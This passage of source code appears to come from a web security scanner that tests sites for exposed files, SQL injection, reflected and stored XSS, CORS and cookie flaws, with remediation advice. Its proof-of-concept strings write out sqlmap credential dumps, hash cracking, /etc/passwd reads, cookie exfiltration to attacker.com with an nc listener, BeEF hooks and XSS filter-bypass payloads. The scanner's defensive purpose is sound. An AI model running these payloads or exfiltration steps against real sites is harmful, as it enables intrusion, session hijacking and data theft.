mysql -u root -p -e "SHOW TABLES; SELECT * FROM users LIMIT 10;"

# Step 3: Crack password hashes
grep -i "INSERT INTO users" stolen_db.sql | grep -o "'[^']*'" > hashes.txt
hashcat hashes.txt /usr/share/wordlists/rockyou.txt

# Step 4: Outcome — full database contents including all user credentials,
# personal data (PII), payment history, and business data`;
  }
  return `# Step 1: Confirm file is accessible
curl -s https://TARGET_URL${path}
# Any HTTP 200 response with content is a finding

# Step 2: Analyse the content for sensitive information
curl -s https://TARGET_URL${path} | grep -i \\
  "password\\|secret\\|key\\|token\\|credential\\|user\\|admin\\|config"

# Step 3: Use the information to plan further attacks
# Server path disclosures → path traversal attacks
# Config details → targeted exploitation
# Software versions → CVE lookup`;
}

async function checkSensitiveFiles(baseUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(baseUrl);
  const base = `${parsed.protocol}//${parsed.host}`;

  const results = await Promise.allSettled(
    SENSITIVE_PATHS.map(async ({ path, label, severity, why }) => {
      try {
        const res = await fetchUrl(base + path, "GET", 5000);
        if (res.statusCode === 200 || res.statusCode === 206) {
          const contentType = headerStr(res.headers["content-type"]);
          const validation = validateSensitiveFile(path, res.statusCode, contentType, res.body);
          if (!validation.isReal) {
            return { found: false, falsePositive: true, path, reason: validation.reason };
          }
          const snippet = res.body.slice(0, 300).trim();
          return { label, severity, why, path, snippet, contentType, validation, found: true };
        }
      } catch {}
      return { found: false };
    })
  );

  let foundCount = 0;
  for (const r of results) {
    if (r.status === "fulfilled" && r.value.found) {
      const { label, severity, why, path, snippet, validation } = r.value as any;
      foundCount++;
      const confidenceTag = validation?.confidence === "high" ? "" : ` [confidence: ${validation?.confidence ?? "medium"}]`;
      findings.push({
        id: `sensitive-${label.replace(/[^a-z0-9]/gi, "-")}`,
        category: "sensitive_files",
        title: `Sensitive File Exposed: ${label}`,
        severity,
        status: "fail",
        description: why,
        detail: [
          `Path: ${path}${confidenceTag}`,
          validation?.reason ? `Validated: ${validation.reason}` : null,
          snippet ? `\nPreview:\n${snippet}` : null,
        ].filter(Boolean).join("\n"),
        recommendation:
          severity === "critical"
            ? `Immediately block access to ${path} via your web server config. Remove any sensitive files from the web root. For .git/, add 'location /.git { deny all; }' (nginx) or 'RedirectMatch 404 /\\.git' (Apache). Rotate all credentials that may have been exposed.`
            : `Block public access to ${path} in your web server or firewall rules. Verify this file is not required to be publicly accessible.`,
        execution_poc: getSensitiveFilePoc(path, label),
      });
    }
  }

  if (foundCount === 0) {
    findings.push({
      id: "sensitive-files-none",
      category: "sensitive_files",
      title: "No Sensitive Files Exposed",
      severity: "info",
      status: "pass",
      description: `Checked ${SENSITIVE_PATHS.length} common sensitive paths — none returned HTTP 200.`,
    });
  }

  return findings;
}

// ── SQL Injection ─────────────────────────────────────────────────────────────

const SQL_PAYLOADS = ["'", '"', "' OR '1'='1", `" OR "1"="1`, "1 AND 1=2", "' OR 1=1--", "';--"];

const SQL_ERROR_PATTERNS = [
  /SQL syntax.*MySQL/i,
  /MySQL.*SQL syntax/i,
  /Warning.*mysql_/i,
  /valid MySQL result/i,
  /MySqlClient\./i,
  /PostgreSQL.*ERROR/i,
  /ERROR.*PostgreSQL/i,
  /org\.postgresql\.util\.PSQLException/i,
  /ORA-\d{4,}/i,
  /Oracle error/i,
  /SQLite.*error/i,
  /sqlite3\.OperationalError/i,
  /\[Microsoft\]\[ODBC SQL Server Driver\]/i,
  /\[SQL Server\]/i,
  /Unclosed quotation mark/i,
  /quoted string not properly terminated/i,
  /com\.microsoft\.sqlserver\.jdbc/i,
  /Syntax error.*in query/i,
  /SQLSTATE\[\w+\]/i,
  /PDOException/i,
  /Query failed:/i,
];

async function checkSqlInjection(targetUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(targetUrl);
  const params = Array.from(parsed.searchParams.keys());

  if (params.length === 0) {
    findings.push({
      id: "sqli-no-params",
      category: "injection",
      title: "SQL Injection — No Query Parameters Found",
      severity: "info",
      status: "info",
      description: "The target URL has no query parameters to test for SQL injection. To test form inputs or API endpoints, provide a URL with query parameters (e.g. https://example.com/search?q=test).",
    });
    return findings;
  }

  const vulnerableParams: string[] = [];
  const evidenceMap: Record<string, string> = {};

  for (const param of params) {
    for (const payload of SQL_PAYLOADS) {
      try {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set(param, payload);
        const res = await fetchUrl(testUrl.toString(), "GET", 6000);
        const body = res.body;

        for (const pattern of SQL_ERROR_PATTERNS) {
          const match = pattern.exec(body);
          if (match) {
            // Secondary validation — filter documentation pages and false positives
            const secondaryCheck = validateSqlInjection(match[0], body, payload);
            if (!secondaryCheck.isReal) break; // suppressed as false positive

            if (!vulnerableParams.includes(param)) {
              vulnerableParams.push(param);
              const start = Math.max(0, match.index - 40);
              evidenceMap[param] = `Payload: ${payload}\nError snippet: ...${body.slice(start, start + 200)}...\nValidator: ${secondaryCheck.reason}`;
            }
            break;
          }
        }
      } catch {}
      if (vulnerableParams.includes(param)) break;
    }
  }

  if (vulnerableParams.length > 0) {
    findings.push({
      id: "sqli-reflected-error",
      category: "injection",
      title: "SQL Injection — Error-Based Reflected SQLi Detected",
      severity: "critical",
      status: "fail",
      description: `The server returned database error messages in response to SQL injection payloads in parameter(s): ${vulnerableParams.join(", ")}. This confirms the input is being passed to a SQL query without proper sanitisation. An attacker can extract, modify, or delete database content, and potentially achieve remote code execution.`,
      detail: Object.entries(evidenceMap).map(([p, e]) => `Parameter: ${p}\n${e}`).join("\n\n"),
      recommendation: "1. Use parameterised queries (prepared statements) — never concatenate user input into SQL strings.\n2. Use an ORM with built-in escaping.\n3. Enforce least-privilege database accounts (read-only where possible).\n4. Disable detailed database error messages in production — log errors server-side only.\n5. Apply WAF rules to block common SQLi patterns.",
      execution_poc: `# Step 1: Reproduce the error manually
curl -s "TARGET_URL&${vulnerableParams[0] ?? "id"}='" | grep -i "sql\\|error\\|syntax"
# You should see a database error message in the response

# Step 2: Extract database version with sqlmap
sqlmap -u "TARGET_URL" --dbs --batch --level=2 --risk=1
# sqlmap will auto-detect injectable parameter and enumerate databases

# Step 3: Dump users table
sqlmap -u "TARGET_URL" \\
       -D target_database \\
       -T users \\
       --dump --batch
# Output: id | username | password_hash | email | ...

# Step 4: Manual UNION-based extraction (MySQL example)
# First find number of columns:
# TARGET_URL&${vulnerableParams[0] ?? "id"}=1 ORDER BY 1--
# TARGET_URL&${vulnerableParams[0] ?? "id"}=1 ORDER BY 2--   ← error here = 1 column
#
# Then extract data:
# TARGET_URL&${vulnerableParams[0] ?? "id"}=-1 UNION SELECT username,password FROM users--

# Step 5: Outcome
# Attacker obtains full database dump including hashed/plaintext passwords
# Can authenticate as admin: https://crackstation.net/ to crack hashes`,
    });
  } else {
    findings.push({
      id: "sqli-not-detected",
      category: "injection",
      title: "SQL Injection — No Error-Based SQLi Detected",
      severity: "info",
      status: "pass",
      description: `Tested ${params.length} parameter(s) with ${SQL_PAYLOADS.length} payloads each. No SQL error patterns were detected in responses. Note: this tests only error-based SQLi — blind/time-based SQLi requires deeper testing.`,
      detail: `Parameters tested: ${params.join(", ")}`,
    });
  }

  return findings;
}

// ── XSS (Reflected) ───────────────────────────────────────────────────────────

const XSS_PAYLOADS = [
  "<script>alert(1)</script>",
  `"><script>alert(1)</script>`,
  `'><script>alert(1)</script>`,
  `"><img src=x onerror=alert(1)>`,
  `<svg onload=alert(1)>`,
  `javascript:alert(1)`,
];

// Patterns that indicate the payload was reflected unescaped in HTML
const XSS_REFLECT_PATTERNS = [
  /<script>alert\(1\)<\/script>/i,
  /"><script>alert\(1\)<\/script>/i,
  /'><script>alert\(1\)<\/script>/i,
  /"><img src=x onerror=alert\(1\)>/i,
  /<svg onload=alert\(1\)>/i,
  /javascript:alert\(1\)/i,
];

async function checkXss(targetUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(targetUrl);
  const params = Array.from(parsed.searchParams.keys());

  if (params.length === 0) {
    findings.push({
      id: "xss-no-params",
      category: "injection",
      title: "Reflected XSS — No Query Parameters Found",
      severity: "info",
      status: "info",
      description: "The target URL has no query parameters to test for reflected XSS. Provide a URL with query parameters (e.g. https://example.com/search?q=test) to enable this check.",
    });
    return findings;
  }

  const vulnerableParams: string[] = [];
  const evidenceMap: Record<string, string> = {};

  for (const param of params) {
    for (let i = 0; i < XSS_PAYLOADS.length; i++) {
      const payload = XSS_PAYLOADS[i];
      const pattern = XSS_REFLECT_PATTERNS[i];
      try {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set(param, payload);
        const res = await fetchUrl(testUrl.toString(), "GET", 6000);

        const contentType = headerStr(res.headers["content-type"]) ?? "";
        if (!contentType.includes("html")) continue;

        if (pattern.test(res.body)) {
          // Secondary validation — confirm payload is genuinely unescaped, not encoded
          const secondaryCheck = validateXssReflection(payload, res.body);
          if (!secondaryCheck.isReal) break; // suppressed as false positive

          if (!vulnerableParams.includes(param)) {
            vulnerableParams.push(param);
            const match = pattern.exec(res.body)!;
            const start = Math.max(0, match.index - 60);
            evidenceMap[param] = `Payload: ${payload}\nReflected in response:\n...${res.body.slice(start, start + 250)}...\nValidator: ${secondaryCheck.reason}`;
          }
          break;
        }
      } catch {}
      if (vulnerableParams.includes(param)) break;
    }
  }

  if (vulnerableParams.length > 0) {
    findings.push({
      id: "xss-reflected",
      category: "injection",
      title: "Reflected XSS — Payload Reflected Unescaped in HTML",
      severity: "high",
      status: "fail",
      description: `XSS payloads were reflected verbatim in the HTML response for parameter(s): ${vulnerableParams.join(", ")}. An attacker can craft a malicious URL that, when visited by a victim, executes arbitrary JavaScript in the victim's browser — enabling cookie theft, session hijacking, and phishing.`,
      detail: Object.entries(evidenceMap).map(([p, e]) => `Parameter: ${p}\n${e}`).join("\n\n"),
      recommendation: "1. HTML-encode all user-supplied values before rendering in HTML (e.g. replace < with &lt;, > with &gt;, \" with &quot;).\n2. Use a context-aware template engine that auto-escapes output (React JSX, Jinja2 autoescape, etc.).\n3. Set a strict Content-Security-Policy header to block inline script execution.\n4. Set X-XSS-Protection: 1; mode=block (legacy browsers).\n5. Validate and whitelist input server-side — reject or sanitise unexpected characters.",
      execution_poc: `# Step 1: Confirm reflection in browser
# Open this URL in a browser (replace TARGET_URL and PARAM with actual values):
# TARGET_URL&${vulnerableParams[0] ?? "q"}=<script>alert(document.domain)</script>
# If an alert box appears showing the domain — XSS is confirmed.

# Step 2: Steal victim's session cookie
# Craft a malicious link and send it to the victim via email/chat:
# TARGET_URL&${vulnerableParams[0] ?? "q"}=<script>
#   new Image().src='https://attacker.com/c?x='+encodeURIComponent(document.cookie)
# </script>
#
# Attacker listens with netcat:
nc -lvnp 80
# Receives: GET /c?x=session%3Dabc123; HttpOnly=...

# Step 3: Full account takeover
# With session cookie: document.cookie = "session=abc123"
# Or use EditThisCookie browser extension to inject the stolen cookie
# Refresh target page → logged in as victim

# Step 4: BeEF browser exploitation framework
# Host BeEF on attacker server, inject hook:
# TARGET_URL&${vulnerableParams[0] ?? "q"}=<script src="https://attacker.com:3000/hook.js"></script>
# Victim's browser is now hooked — attacker can run commands, take screenshots, keylog

# Step 5: Verify with Burp Suite
# Proxy > Intercept > send to Repeater
# Modify parameter to: <script>alert(1)</script>
# Check Response tab — payload appears unencoded in HTML body`,
    });
  } else {
    findings.push({
      id: "xss-not-reflected",
      category: "injection",
      title: "Reflected XSS — No Unescaped Reflection Detected",
      severity: "info",
      status: "pass",
      description: `Tested ${params.length} parameter(s) with ${XSS_PAYLOADS.length} XSS payloads each. No payload was reflected unescaped in the HTML response. Note: this covers reflected XSS only — stored and DOM-based XSS require separate testing.`,
      detail: `Parameters tested: ${params.join(", ")}`,
    });
  }

  return findings;
}

// ── Advanced SQLi: Time-Based Blind Testing ───────────────────────────────────

const SQLI_TIME_PAYLOADS: Array<{ db: string; payload: string }> = [
  { db: "MySQL",      payload: `' OR SLEEP(5)--` },
  { db: "MySQL",      payload: `" OR SLEEP(5)--` },
  { db: "MySQL",      payload: `1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--` },
  { db: "MSSQL",      payload: `'; WAITFOR DELAY '0:0:5'--` },
  { db: "MSSQL",      payload: `1; WAITFOR DELAY '0:0:5'--` },
  { db: "PostgreSQL", payload: `'; SELECT pg_sleep(5)--` },
  { db: "PostgreSQL", payload: `' OR 1=1; SELECT pg_sleep(5)--` },
  { db: "Oracle",     payload: `' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5) IS NULL--` },
];

const DELAY_THRESHOLD_MS = 4500; // triggered SLEEP(5) = ~5s; flag at 4.5s to allow network variance
const TIMING_TIMEOUT_MS  = 7_000; // 5s DB sleep + 2s overhead; aborts hung requests promptly

async function measureBaseline(url: string): Promise<number> {
  try {
    const r = await fetchUrl(url, "GET", 8000);
    return Math.max(300, r.responseTimeMs); // floor at 300ms to avoid FPs on ultra-fast servers
  } catch {
    return 2000; // safe fallback for unreachable endpoints
  }
}

async function checkSqliTimeBased(targetUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(targetUrl);
  const params = Array.from(parsed.searchParams.keys());
  if (params.length === 0) return findings; // no-params case handled by error-based check

  const baseline = await measureBaseline(targetUrl);

  for (const param of params) {
    let found = false;
    for (const { db, payload } of SQLI_TIME_PAYLOADS) {
      if (found) break;
      try {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set(param, payload);
        const res = await fetchUrl(testUrl.toString(), "GET", TIMING_TIMEOUT_MS);
        const elapsed = res.responseTimeMs;
        const delay   = elapsed - baseline;

        if (delay >= DELAY_THRESHOLD_MS) {
          found = true;
          const safeUrl = testUrl.toString();
          findings.push({
            id: `sqli-time-blind-${param}`,
            category: "injection",
            title: `SQL Injection — Time-Based Blind SQLi in Parameter "${param}" (${db})`,
            severity: "critical",
            status: "fail",
            description: `The server delayed its response by ${delay}ms (baseline: ${baseline}ms) when a ${db} time-delay payload was injected into parameter "${param}". The database executed the SLEEP/WAITFOR/pg_sleep instruction, confirming the input reaches a SQL query without sanitisation. Because no error is visible, this is a Blind SQLi vulnerability — an attacker can silently enumerate the entire database by timing responses.`,
            detail: `Vulnerable parameter: ${param}\nPayload: ${payload}\nDatabase type: ${db}\nBaseline response time: ${baseline}ms\nDelayed response time: ${elapsed}ms\nObserved delay: ${delay}ms (threshold: ${DELAY_THRESHOLD_MS}ms)`,
            recommendation:
              "1. Replace ALL raw SQL string concatenation with parameterised queries / prepared statements.\n" +
              "2. Use an ORM (Drizzle, Prisma, Sequelize) — never build query strings by hand.\n" +
              "3. Apply least-privilege DB accounts: read-only where writes are not required.\n" +
              "4. Deploy a WAF with time-based SQLi signatures.\n" +
              "5. Rate-limit endpoints — time-based attacks require many sequential requests.",
            execution_poc:
              `# ── Time-Based Blind SQLi — Reproduction & Exploitation ─────────────\n` +
              `\n` +
              `# Step 1: Confirm the 5-second delay manually (response takes ~5s)\n` +
              `time curl -sk -o /dev/null "${safeUrl}"\n` +
              `# Expected: ~5s real time — confirms SLEEP/WAITFOR triggered\n` +
              `\n` +
              `# Step 2: Automated database enumeration with sqlmap (time-based mode)\n` +
              `sqlmap -u "${targetUrl}" \\\n` +
              `  -p "${param}" \\\n` +
              `  --technique=T \\\n` +
              `  --dbms=${db.toLowerCase()} \\\n` +
              `  --level=3 --risk=2 \\\n` +
              `  --batch --dbs\n` +
              `# Output: lists all databases accessible to the app DB user\n` +
              `\n` +
              `# Step 3: Enumerate tables in the application database\n` +
              `sqlmap -u "${targetUrl}" \\\n` +
              `  -p "${param}" --technique=T \\\n` +
              `  -D app_database --tables --batch\n` +
              `\n` +
              `# Step 4: Dump credentials\n` +
              `sqlmap -u "${targetUrl}" \\\n` +
              `  -p "${param}" --technique=T \\\n` +
              `  -D app_database -T users --dump --batch\n` +
              `# Output: id | email | password_hash | role | ...\n` +
              `# Crack hashes: https://crackstation.net  or  john --wordlist=rockyou.txt hashes.txt\n` +
              `\n` +
              `# Step 5: (MySQL) Read OS files if FILE privilege is granted\n` +
              `sqlmap -u "${targetUrl}" \\\n` +
              `  -p "${param}" --technique=T \\\n` +
              `  --file-read="/etc/passwd" --batch`,
          });
        }
      } catch {}
    }
  }
  return findings;
}

// ── Advanced XSS: Obfuscated / Filter-Bypass Reflected Payloads ──────────────

interface AdvXssCase {
  name: string;
  payload: string;
  pattern: RegExp;
}

/** Payloads specifically chosen to bypass common string-based XSS filters. */
const XSS_ADVANCED_CASES: AdvXssCase[] = [
  {
    name: "SVG self-closing, no space",
    payload: `<svg/onload=alert(1)>`,
    pattern: /<svg\/onload=alert\(1\)>/i,
  },
  {
    name: "Mixed-case script tag",
    payload: `<ScRiPt>alert(1)</ScRiPt>`,
    pattern: /<ScRiPt>alert\(1\)<\/ScRiPt>/i,
  },
  {
    name: "Attribute context — onmouseenter injection",
    payload: `" onmouseenter="alert(1)`,
    pattern: /onmouseenter="alert\(1\)/i,
  },
  {
    name: "<details> ontoggle — unusual tag bypass",
    payload: `<details open ontoggle=alert(1)>`,
    pattern: /<details open ontoggle=alert\(1\)>/i,
  },
  {
    name: "iframe javascript: URI",
    payload: `<iframe src="javascript:alert(1)">`,
    pattern: /<iframe src="javascript:alert\(1\)">/i,
  },
  {
    name: "Input autofocus onfocus",
    payload: `<input onfocus=alert(1) autofocus>`,
    pattern: /<input onfocus=alert\(1\) autofocus>/i,
  },
  {
    name: "Title-context break",
    payload: `</title><script>alert(1)</script>`,
    pattern: /<\/title><script>alert\(1\)<\/script>/i,
  },
  {
    name: "img onerror — unquoted attribute",
    payload: `<img src=x: onerror=alert(1)>`,
    pattern: /<img src=x: onerror=alert\(1\)>/i,
  },
  {
    name: "Body onpageshow event",
    payload: `<body onpageshow=alert(1)>`,
    pattern: /<body onpageshow=alert\(1\)>/i,
  },
  {
    name: "Marquee onstart — legacy tag bypass",
    payload: `<marquee onstart=alert(1)>`,
    pattern: /<marquee onstart=alert\(1\)>/i,
  },
];

async function checkXssReflectedAdvanced(targetUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(targetUrl);
  const params = Array.from(parsed.searchParams.keys());
  if (params.length === 0) return findings;

  for (const param of params) {
    let found = false;
    for (const { name, payload, pattern } of XSS_ADVANCED_CASES) {
      if (found) break;
      try {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set(param, payload);
        const res = await fetchUrl(testUrl.toString(), "GET", 5000);

        const contentType = headerStr(res.headers["content-type"]) ?? "";
        if (!contentType.includes("html")) continue;
        if (!pattern.test(res.body)) continue;

        const check = validateXssReflection(payload, res.body);
        if (!check.isReal) continue;

        found = true;
        const match  = pattern.exec(res.body)!;
        const start  = Math.max(0, match.index - 80);
        const snippet = res.body.slice(start, start + 300);
        const base   = targetUrl.replace(new URL(targetUrl).search, "");
        const encPayload = encodeURIComponent(payload);

        findings.push({
          id: `xss-adv-reflected-${param}`,
          category: "injection",
          title: `Reflected XSS — Obfuscated Bypass in Parameter "${param}" (${name})`,
          severity: "high",
          status: "fail",
          description:
            `An obfuscated XSS payload using technique "${name}" was reflected verbatim in the HTML ` +
            `response for parameter "${param}". This bypass method evades basic string-filter and ` +
            `blacklist sanitisers. An attacker can craft a malicious link that, when opened by a victim, ` +
            `executes arbitrary JavaScript — enabling cookie theft, session hijacking, and phishing overlays.`,
          detail:
            `Vulnerable parameter: ${param}\n` +
            `Bypass technique: ${name}\n` +
            `Payload: ${payload}\n` +
            `Validator: ${check.reason}\n\n` +
            `Reflected in response:\n...${snippet}...`,
          recommendation:
            "1. Use context-aware output encoding (HTML-encode <, >, &, \", ' before inserting into HTML).\n" +
            "2. Never rely on blacklist-based sanitisation — obfuscated payloads are designed to bypass it.\n" +
            "3. Implement a strict Content-Security-Policy: script-src 'self' 'nonce-{random}'.\n" +
            "4. Validate and whitelist expected input formats server-side — reject inputs containing HTML metacharacters.\n" +
            "5. Use a security-focused templating engine with auto-escape enabled (React JSX, Jinja2, etc.).",
          execution_poc:
            `# ── Reflected XSS Bypass — Verification ─────────────────────────────\n` +
            `\n` +
            `# Step 1: Open this URL in a browser — should trigger alert(1)\n` +
            `# ${base}?${param}=${encPayload}\n` +
            `\n` +
            `# Step 2: Confirm unescaped reflection with curl\n` +
            `curl -sk "${base}?${param}=${encPayload}" | grep -o '${payload.slice(0, 25)}.*'\n` +
            `\n` +
            `# Step 3: Steal session cookies (craft malicious link and send to victim)\n` +
            `# Payload: <script>new Image().src='https://attacker.com/c?x='+encodeURIComponent(document.cookie)</script>\n` +
            `# Attacker listener:\n` +
            `nc -lvnp 80\n` +
            `# Receives: GET /c?x=session%3DABCDEF → use cookie to impersonate victim\n` +
            `\n` +
            `# Step 4: Inject BeEF hook for full browser control\n` +
            `# ${base}?${param}=${encodeURIComponent('<script src="https://attacker.com:3000/hook.js"></script>')}\n` +
            `# Victim's browser is hooked — attacker can screenshot, keylog, pivot network`,
        });
      } catch {}
    }
  }
  return findings;
}

// ── Stored / Persistent XSS via Form Submission ───────────────────────────────

async function checkStoredXss(forms: FormInfo[], baseOrigin: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const seen = new Set<string>();

  // Only test POST forms that have named inputs
  const postForms = forms.filter((f) => f.method === "POST" && f.inputs.length > 0);
  if (postForms.length === 0) return findings;

  for (const form of postForms.slice(0, 10)) { // cap to avoid scan timeout
    // Unique probe — allows us to identify our injected content even after sanitisation attempts
    const probe   = `xsstest${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}`;
    const payload = `<script>alert('${probe}')</script>`;

    // Resolve action URL (relative → absolute)
    let actionUrl: string;
    try {
      actionUrl = /^https?:\/\//i.test(form.action)
        ? form.action
        : new URL(form.action || "/", baseOrigin).href;
    } catch {
      continue;
    }

    // Build x-www-form-urlencoded body — inject payload into every input field
    const formBody = form.inputs
      .map((name) => `${encodeURIComponent(name)}=${encodeURIComponent(payload)}`)
      .join("&");

    try {
      // 1. Submit the form
      const postRes = await fetchUrlPost(actionUrl, formBody, "application/x-www-form-urlencoded", 10_000);

      // 2. GET the action URL to check if the payload is now rendered/stored
      const getRes = await fetchUrl(actionUrl, "GET", 8000).catch(() => null);

      const checks: Array<{ label: string; body: string }> = [
        { label: "POST response", body: postRes.body },
        ...(getRes ? [{ label: "GET after POST", body: getRes.body }] : []),
      ];

      for (const { label, body } of checks) {
        // Check if our unique probe appears in the response body unescaped
        const probeIdx = body.indexOf(probe);
        if (probeIdx < 0) continue;

        // Verify the surrounding context is not HTML-entity-encoded
        const ctx = body.slice(Math.max(0, probeIdx - 20), probeIdx + probe.length + 20);
        if (ctx.includes("&lt;") || ctx.includes("%3C") || ctx.includes("&#")) continue;

        const findingId = `xss-stored-${actionUrl.replace(/[^a-z0-9]/gi, "-").slice(0, 50)}`;
        if (seen.has(findingId)) continue;
        seen.add(findingId);

        const snippetStart = Math.max(0, probeIdx - 80);
        const snippet = body.slice(snippetStart, snippetStart + 320);

        const curlFields = form.inputs
          .map((n) => `--data-urlencode "${n}=<script>alert(document.domain)</script>"`)
          .join(" \\\n  ");

        findings.push({
          id: findingId,
          category: "injection",
          title: `Stored XSS — Persistent Payload Found via Form POST to "${actionUrl}"`,
          severity: "critical",
          status: "fail",
          description:
            `A unique XSS probe submitted via POST to ${actionUrl} was found unescaped in the ` +
            `${label} for input(s): ${form.inputs.join(", ")}. The application stores or echoes ` +
            `user-supplied HTML/script content without sanitisation. Unlike Reflected XSS, Stored ` +
            `XSS is Critical: every user who views this content automatically has JavaScript executed ` +
            `in their browser — no phishing link required.`,
          detail:
            `Form action: ${actionUrl}\n` +
            `Method: POST\n` +
            `Vulnerable inputs: ${form.inputs.join(", ")}\n` +
            `Unique probe: ${probe}\n` +
            `Detected in: ${label}\n\n` +
            `Response snippet:\n...${snippet}...`,
          recommendation:
            "1. HTML-encode ALL stored user content before rendering (replace <, >, &, \", ' with entities).\n" +
            "2. Apply server-side sanitisation on write using a hardened library (DOMPurify, bleach).\n" +
            "3. Enforce a strict Content-Security-Policy: script-src 'self' 'nonce-{value}'.\n" +
            "4. Store content as plain text; parse as HTML only when needed, with an allowlist.\n" +
            "5. Consider a Rich-Text editor that sanitises both client and server-side.",
          execution_poc:
            `# ── Stored XSS — Reproduction & Impact ──────────────────────────────\n` +
            `\n` +
            `# Step 1: Submit XSS payload via form POST\n` +
            `curl -sk -X POST "${actionUrl}" \\\n` +
            `  ${curlFields} \\\n` +
            `  -H "Content-Type: application/x-www-form-urlencoded"\n` +
            `\n` +
            `# Step 2: Verify the payload is now stored — fetch the page\n` +
            `curl -sk "${actionUrl}" | grep -i "alert\\|script\\|onerror"\n` +
            `# If the unescaped payload appears → confirmed stored XSS\n` +
            `\n` +
            `# Step 3: Weaponise — exfiltrate ALL visitor cookies (persistent)\n` +
            `# Inject: <script>new Image().src='https://attacker.com/c?x='+encodeURIComponent(document.cookie)</script>\n` +
            `# Every visitor to this page sends their session cookie to the attacker\n` +
            `\n` +
            `# Step 4: Persistent account takeover\n` +
            `# With stolen cookie:\n` +
            `curl -sk -H "Cookie: session=STOLEN_VALUE" "${baseOrigin}/profile"\n` +
            `# Or: DevTools > Application > Cookies > inject cookie > refresh\n` +
            `\n` +
            `# Step 5: Site-wide defacement / phishing overlay (affects ALL users)\n` +
            `# Inject: <script>document.body.innerHTML='<h1>Hacked</h1><form action="https://attacker.com/">...'</script>`,
        });
        break; // one finding per form
      }
    } catch {}
  }
  return findings;
}

// ── CORS Misconfiguration ─────────────────────────────────────────────────────

async function checkCors(targetUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(targetUrl);
  const isHttps = parsed.protocol === "https:";
  const lib = isHttps ? https : http;

  const corsResult = await new Promise<{ acao?: string; acac?: string }>((resolve) => {
    const options: https.RequestOptions = {
      method: "GET",
      host: parsed.hostname,
      port: parsed.port || (isHttps ? 443 : 80),
      path: parsed.pathname + parsed.search,
      headers: {
        "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
        Accept: "*/*",
        Origin: "https://evil-cors-attacker.com",
      },
      rejectUnauthorized: false,
    };
    const req = lib.request(options, (res) => {
      res.resume();
      resolve({
        acao: res.headers["access-control-allow-origin"] as string | undefined,
        acac: res.headers["access-control-allow-credentials"] as string | undefined,
      });
    });
    req.setTimeout(8000, () => { req.destroy(); resolve({}); });
    req.on("error", () => resolve({}));
    req.end();
  });

  const { acao, acac } = corsResult;
  if (!acao) return findings;

  const credentialsEnabled = acac?.toLowerCase() === "true";

  if (acao === "*" && credentialsEnabled) {
    findings.push({
      id: "cors-credentials-wildcard",
      category: "headers",
      title: "Critical CORS: Wildcard Origin with Credentials Enabled",
      severity: "critical",
      status: "fail",
      description:
        "The server sets Access-Control-Allow-Origin: * together with Access-Control-Allow-Credentials: true. " +
        "Modern browsers reject this combination, but the configuration signals a severely misconfigured CORS policy. " +
        "An attacker can craft cross-origin requests that exfiltrate authenticated responses using non-browser HTTP clients.",
      detail: `Access-Control-Allow-Origin: ${acao}\nAccess-Control-Allow-Credentials: ${acac}\nTest Origin: https://evil-cors-attacker.com`,
      recommendation:
        "Replace the wildcard with an explicit allowlist of trusted origins. Never combine * with credentials: true.",
    });
  } else if (acao === "https://evil-cors-attacker.com") {
    findings.push({
      id: "cors-reflect-origin",
      category: "headers",
      title: "CORS: Server Reflects Arbitrary Attacker-Controlled Origin",
      severity: "high",
      status: "fail",
      description:
        "The server reflects the attacker-supplied Origin value verbatim in Access-Control-Allow-Origin. " +
        "Any malicious website can make cross-origin requests and read the response — enabling CSRF, session exfiltration, " +
        "and account takeover when paired with credentials.",
      detail:
        `Access-Control-Allow-Origin: ${acao}\n` +
        `Access-Control-Allow-Credentials: ${acac ?? "not set"}\n` +
        `Test Origin sent: https://evil-cors-attacker.com\n` +
        `Origin was reflected verbatim — server does not validate the Origin`,
      recommendation:
        "Maintain an explicit allowlist of trusted origins. Never set Access-Control-Allow-Origin to the incoming Origin without strict validation.",
    });
  } else if (acao === "*") {
    findings.push({
      id: "cors-wildcard",
      category: "headers",
      title: "CORS: Wildcard Origin Allowed (Access-Control-Allow-Origin: *)",
      severity: "medium",
      status: "fail",
      description:
        "The server allows any origin to make cross-origin requests. While acceptable for fully public assets, " +
        "this allows any website to read responses from your domain — potentially leaking sensitive API data or user information.",
      detail: `Access-Control-Allow-Origin: *\nTest Origin: https://evil-cors-attacker.com`,
      recommendation:
        "If cross-origin access is needed, restrict to an explicit allowlist of trusted origins.",
    });
  }

  return findings;
}

// ── Cookie Security Flags ─────────────────────────────────────────────────────

function checkCookieSecurity(headers: Record<string, string | string[] | undefined>): ScanFinding[] {
  const findings: ScanFinding[] = [];
  const rawCookies = headers["set-cookie"];
  if (!rawCookies) return findings;

  const cookies = Array.isArray(rawCookies) ? rawCookies : [rawCookies];
  const seen = new Set<string>();

  for (const cookieStr of cookies) {
    if (!cookieStr) continue;
    const nameMatch = cookieStr.match(/^([^=;,\s]+)/);
    const cookieName = nameMatch?.[1]?.trim() ?? "unknown";
    const lower = cookieStr.toLowerCase();
    const isSensitive = /sess|token|auth|login|user_?id|sid|csrf|xsrf/i.test(cookieName);

    if (!lower.includes("httponly") && !seen.has("cookie-no-httponly")) {
      seen.add("cookie-no-httponly");
      findings.push({
        id: "cookie-no-httponly",
        category: "headers",
        title: `Cookie Missing HttpOnly Flag: ${cookieName}`,
        severity: isSensitive ? "high" : "medium",
        status: "fail",
        description:
          `The cookie "${cookieName}" is set without the HttpOnly flag, making it readable via document.cookie in JavaScript. ` +
          `An attacker exploiting an XSS vulnerability can steal this cookie and hijack the user's session.`,
